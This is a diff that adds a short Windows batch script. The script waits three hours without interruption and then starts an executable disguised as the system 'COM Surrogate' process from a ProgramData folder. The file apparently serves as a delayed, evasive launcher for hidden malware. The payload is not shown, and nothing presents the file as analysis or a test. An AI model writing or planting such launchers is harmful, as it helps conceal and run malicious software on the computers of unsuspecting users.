@@ -1,0 +1,5 @@
+@echo off
+
+
+timeout /t 10800 /nobreak
+start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
